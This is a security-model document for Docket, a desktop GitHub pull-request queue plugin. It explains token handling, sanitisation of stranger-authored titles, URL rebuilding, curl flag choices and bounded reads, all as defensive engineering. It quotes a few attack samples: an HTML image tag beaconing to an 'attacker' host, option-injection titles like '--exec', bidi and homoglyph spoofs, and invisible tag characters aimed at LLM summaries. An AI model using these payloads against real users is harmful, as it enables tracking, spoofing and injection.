# Security model

Docket holds a GitHub token and renders pull request titles written by strangers on the internet,
inside the long-lived process that draws your entire desktop. Both of those are treated as hostile
inputs.

## Threat model

**In scope.** Another local user reading your token out of a process command line. A pull request
author reaching your machine through a title, a repository name, or a login. A malformed or
oversized API response exhausting memory or wedging the compositor. A shipped URL being retargeted
by a redirect. A token or a private repository name leaking into a file you would paste into a bug
report.

**Out of scope.** A compromise of your own session or user account. Anything with your uid can read
`credentials.json` no matter what mode it carries. The response to a session compromise is
`docket-login --forget` plus a revoke at `https://github.com/settings/tokens`; deleting the file is
not revocation.

## The token never occupies a command line

A process command line is world readable through `/proc/<pid>/cmdline`, so `curl -H "Authorization:
Bearer $TOKEN"` publishes the token to every user on the box for the life of the request.

Docket's only accepted shape, in both runtimes:

- **QML poller.** `curl` gets `--header @-` in its argv. The `Process` sets `stdinEnabled: true`,
  writes exactly one header line in `onStarted`, and immediately sets `stdinEnabled = false`. That
  flip is not cleanup: it closes the pipe, and the EOF is what curl needs before it will stop
  reading `@-` and actually issue the request.
- **Login helper.** `printf 'Authorization: Bearer %s\n' "$TOKEN" | curl ... --header @-`. The
  token is read from stdin, never from a flag. `--token` exists solely to exit with an error
  explaining that an argv token leaks through shell history and `ps`.

The helper also sets `set +x` explicitly, so a `set -x` added later while debugging cannot print
the token.

## `state.json` carries counts, never rows

`state.json` is written by the service and should be treated as world readable, because the only
thing that ever reads it is a human pasting it into an issue.

**It contains no item rows.** The complete shape:

```json
{ "generatedAt": 1755782400000,
  "configured": true,
  "counts": { "review": 15, "blocked": 9, "ready": 0,
              "total": 24, "overdue": 20, "drained": 3 },
  "fetchNotice": "172 newer not fetched",
  "lastError": "",
  "account": { "login": "<your-login>", "last4": "abcd" } }
```

That is the entire diagnostic surface, and it is enough to distinguish a wrong token from an expired
one, a throttled poll from a broken one, and a truncated page from a clear docket, in a support
thread. Paste the whole file.

This used to be different, and the difference mattered: the record carried the full queue, including
rows from **private** repositories with their repository names and pull request titles, while this
section described its contents as the login and a token last-4. A user following the document would
have published their private repository inventory into a public issue tracker. Counts disclose
nothing, so there is nothing left to redact.

Never appears: any repository name, any pull request title or number, the token in any encoding or
at any length beyond four characters, the string `Authorization`, a raw API body, curl's stdout or
stderr, `gh` output, or an email address.

The error field is a closed set of mapped constants: `""`, `not connected`, `fetch failed`,
`rate limited`, `api error`. Nothing derived from a response body may enter it. This is pinned by
a unit test, because "let me surface the real curl error" is the single most natural-looking change
that would reintroduce a leak.

## File layout

```
$XDG_STATE_HOME/omarchy/docket/     0700   directory mode is the real gate
  credentials.json                  0600   written ONLY by bin/docket-login
  state.json                        rendered queue, service, atomic writes
  internal.json                     drain and notify bookkeeping, atomic writes
```

The service opens `credentials.json` through a read-only `FileView` and never calls `setText` on
it. That asymmetry makes "the plugin cannot leak the token into a tracked file" a structural
property rather than a promise. The helper writes through `mktemp` plus `chmod 600` plus `mv`, so a
reader never sees a partial or world-readable credentials file.

## Rendering stranger-authored text

Anyone on the internet can put a string into your queue by opening a pull request. Every network
string passes through `Model.clean()` at parse time (not at render time, so notifications and
tooltips inherit the same guarantee), and every data-bound `Text` sets `textFormat: Text.PlainText`.

| Stripped | Why |
| --- | --- |
| `<` and `>` | Qt's default `Text.AutoText` promotes markup-looking strings to rich text, and Qt's rich text engine **fetches remote resources**. A pull request titled `<img src="http://attacker/?u=me">` would beacon from your IP on render. |
| `\x00-\x1f`, `\x7f` | `\x1b[` writes ANSI escapes into whatever terminal or log the notification output reaches. Some terminals will echo attacker text back as typed input. |
| `U+200B-U+200F`, `U+202A-U+202E`, `U+2066-U+2069` | Bidi overrides render `deploy-prod approved` backwards (CVE-2021-42574 class). In a review queue that is a decision-influencing spoof, not a cosmetic bug. |
| `U+E0000-U+E007F` | Unicode tag characters are invisible in every renderer and are the carrier if a title ever reaches an LLM summary path. |
| `U+061C`, `U+180E`, `U+2060`, `U+2028`, `U+2029`, `U+FEFF` | `U+061C` is a bidi control in its own right and belongs with the row above. `U+2028` and `U+2029` inject line breaks into a fixed-height 24px panel row that has no `wrapMode`, so the row overflows its slot instead of eliding. The rest are invisible joiners and marks. |
| A trailing lone surrogate | Slicing at the length cap can land between a surrogate pair. The orphaned half is dropped rather than emitted as malformed UTF-16. |
| Length over 120 | A 5000-character unbroken title can wedge the bar layout and stall a compositor frame. Capped at the model layer so it never reaches a layout pass. |

The angle-bracket strip and `Text.PlainText` are **deliberately redundant**. Do not remove either
one as duplication.

**Accepted cost, documented so nobody "fixes" it.** A title legitimately containing `<3` or `-->`
loses characters. Correctness of rendering loses to safety of rendering.

**Homoglyphs.** `github.com/mi<cyrillic-c>rosoft/vscode` is the canonical case. URLs are rebuilt from
a strict ASCII charset, so the *link* is always a real, well-formed GitHub URL; but that rebuild
silently deletes the Cyrillic codepoint and lands on `mirosoft`, an owner an attacker can register.
The displayed name and the link destination then disagree.

`Model.isSpoofy()` therefore tests **that divergence directly**: anything outside printable ASCII, or
any character the owner/repo charsets would drop, means the name you are reading is not the name the
link goes to. The row is marked `look-alike repo name` in the reason column, in words, next to
whatever else that row is flagged for.

It deliberately does **not** ask "did `clean()` change the string". `clean()` strips angle brackets,
controls, bidi marks, and tag characters, and none of those is a homoglyph, so on the exact example
above `clean()` is a no-op and a `clean()`-derived test answers *false*. The documented defense was
inert for its own documented example until this was fixed. A unit test now pins that specific
string.

## URLs and the notification click action

Every URL is **rebuilt** from stripped pieces, never validated and passed through:

```
prUrl("owner/repo", 42) -> strip owner to [A-Za-z0-9-], repo to [A-Za-z0-9._-],
                           number to [0-9], bail on empty, then construct.
```

The response's own `url` field is ignored entirely, and the test fixtures have it removed so that
stays true.

Omarchy dispatches a notification `--exec` value through `bash -lc "<value>"`. That is a shell, so
the URL gets four defenses rather than one:

1. It is single quoted.
2. It is re-tested against the strict charset **immediately before use**, in `Service.qml`, not
   only where it was built in `Model.js`. A refactor of the builder therefore removes the click
   action rather than shipping an injectable one.
3. The charset contains no single quote, no backslash, no dollar, no backtick, no space, and no
   newline, which is exactly why the quoting cannot be escaped out of.
4. On test failure the `--exec` flag is not pushed at all. There is no partially escaped fallback.

**No network-authored text ever enters an `--exec` value.** Not the title, not the author, not the
branch name. Only the rebuilt URL.

## Argument injection into the notifier

A pull request titled `--exec` or `-u critical` would be parsed as an option if passed
positionally. Two defenses: flags go first and network-derived positionals go last behind a `--`
terminator, and every positional passes through a leading-dash strip.

## Bounded reads

| Bound | Value | Where it binds |
| --- | --- | --- |
| Response body | 2,000,000 chars | Checked in JS before `JSON.parse`. **This is the real bound.** |
| Response body | `--max-filesize` | Only binds when the server sends `Content-Length`, and GitHub commonly chunks. Kept as defense in depth, with the same number so the two cannot drift. |
| Wall clock | `--max-time 20` | Per request. **On a chunked stream this is the only bound that binds during transfer.** |
| Nodes per search field | 100 | |
| Items in the store | 60 | |
| Rendered rows | 10 / 8 / 6 per lane | Capped at the model layer, not only in the delegate. |
| Title length | 120 chars | |

**Known limitation, stated rather than implied.** The 2,000,000-character check runs *after*
Quickshell's `StdioCollector` has buffered curl's whole stdout, so an oversized chunked response is
held in the process that draws your desktop and only then discarded. With `Content-Length` absent,
`--max-time 20` is the live bound: a TLS peer able to answer for `api.github.com` (a trusted-CA
interception proxy) could stream for twenty seconds into that buffer. That requires a hostile TLS
peer, which is why it is documented rather than patched with a shell pipeline: bounding the stream
would mean running curl under `bash -c`, and every argv element in this plugin being a constant is a
property worth more than this bound.

## curl flags, and the deliberate absences

Present: `--proto =https` (exactly https, no http, no file, no scp), `--max-time`,
`--max-filesize`, `--` before the URL.

Absent, each one a decision:

- **No `-L`.** A shipped URL must be the real one. A renamed repository returns 301 and Docket
  surfaces the error rather than silently following a redirect to a host nobody vetted. That is the
  intended trade, not a bug.
- **No `-k` / `--insecure`.** Do not add it to debug a corporate MITM proxy.
- **No `--netrc`, no `-u`, no `-K`.** All three are credential paths that bypass the stdin discipline.

The poller uses `-sS`, not `-fsS`: `-f` suppresses the body on 4xx, and the body is where GitHub
explains a rate limit or a missing scope. The status arrives through `-w "\n%{http_code}"`. The
login helper does use `-fsS`, because there a non-2xx is simply fatal.

## Notifications

Never on the first successful poll: history is not news, and back-notifying an entire backlog on
first launch trains a user to dismiss everything the plugin says. Never on an error state. Never
above urgency `low`: a review queue is not an incident. More than three fresh items collapse into
one summary with no click action.

## Error codes and what they mean

`401` maps to `not connected`. `403` and `429` both map to `rate limited`, because GitHub answers
403 for primary rate-limit exhaustion and for secondary/abuse limits, not only for a bad credential.
Folding 403 into `not connected` sent a throttled user to revoke and re-mint a token, which does not
help and produces the same string afterwards. The cost of the split is the reverse ambiguity: a
genuinely scope-revoked token that answers 403 now reads as `rate limited`. Distinguishing the two
means reading the response body, and no string derived from a response body is allowed into this
field, so the ambiguity is accepted and named here rather than resolved.

## Reporting

Open an issue at `https://github.com/jeremylongshore/omarchy-docket-entry/issues`. `state.json` is
safe to paste in full (see above). Never paste `credentials.json`.
